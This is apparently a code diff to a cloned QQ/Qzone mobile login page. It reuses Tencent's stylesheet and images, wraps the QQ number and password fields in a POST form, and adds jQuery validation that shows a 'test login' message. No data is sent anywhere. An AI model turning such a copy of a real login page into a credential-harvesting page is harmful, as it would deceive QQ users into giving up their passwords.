@@ -49,6 +49,7 @@
   </head>
 
   <body>
+     <script src="//cdn.bootcss.com/jquery/3.0.0-rc1/jquery.min.js"  type="text/javascript"></script>
     <link rel="stylesheet" href="http://qzonestyle.gtimg.cn/qzone/phone/style/login.css">
     <!--顶部banner-->
     <a class="banner" data-btn="下载" href="#" id="btn_app_down" style="background-image:url(http://qzonestyle.gtimg.cn/qzone/phone/style/img/act/down-app/qzone-app-download.jpg);"></a>
@@ -173,7 +174,7 @@
       <div id="error_tips">
         <div id="error_tips_content">
           <span id="error_icon"></span>
-          <span id="error_message">您还没有输入密码！</span></div>
+          <span id="error_message"></span></div>
       </div>
       <div id="login" class="login">
         <div id="logo" class="logo"></div>
@@ -185,6 +186,7 @@
           <div id="q_logon_list" class="q_logon_list"></div>
         </div>
         <div id="web_login">
+        <form action="" method="POST">
           <ul id="g_list">
             <li id="g_u">
               <div id="del_touch" class="del_touch">
@@ -198,7 +200,9 @@
               <input id="p" class="inputstyle" maxlength="16" type="password" name="p" autocorrect="off" placeholder="请输入您的QQ密码"></li>
           </ul>
           <div href="javascript:void(0);" id="go">登 录</div>
-          <div href="javascript:void(0);" id="onekey">一键登录</div></div>
+          <div href="javascript:void(0);" id="onekey">一键登录</div>
+          </form>
+          </div>
         <div id="switch">
           <div id="swicth_login" onclick="pt._switch()" style="display:none">快速登录历史帐号</div>
           <div id="zc_feedback">
@@ -277,5 +281,30 @@
   //   window.setTimeout(loadJs, 5e3);
   //   try { / MicroMessenger / i.test(navigator.userAgent) ? document.write('<script src="//res.wx.qq.com/open/js/jweixin-1.0.0.js" type="text/javascript"><\/script>') : /mqqbrowser/i.test(navigator.userAgent) && document.write('<script src="http://jsapi.qq.com/get?api=app.*,env.*,login.*" type="text/javascript"><\/script>')
   //   } catch(e) {}
+    </script>
+    <script>
+        var errContent = $('#error_tips');
+        var errMsg = $('#error_message');
+        $('#go').on('click',function(){
+            if ($('#u').val() === '') {
+                errMsg.html('请输入QQ号！');
+                errContent.css({"display":"block"})
+                setTimeout(function(){
+                    errContent.css({"display":"none"})
+                },1000);
+            } else if($('#p').val() === ''){
+                errMsg.html('你还没有输入密码！');
+                 errContent.css({"display":"block"})
+                setTimeout(function(){
+                    errContent.css({"display":"none"})
+                },1000);
+            } else {
+                errMsg.html('测试登陆！');
+                 errContent.css({"display":"block"})
+                setTimeout(function(){
+                    errContent.css({"display":"none"})
+                },1000);
+            }
+        });
     </script>
 </html>
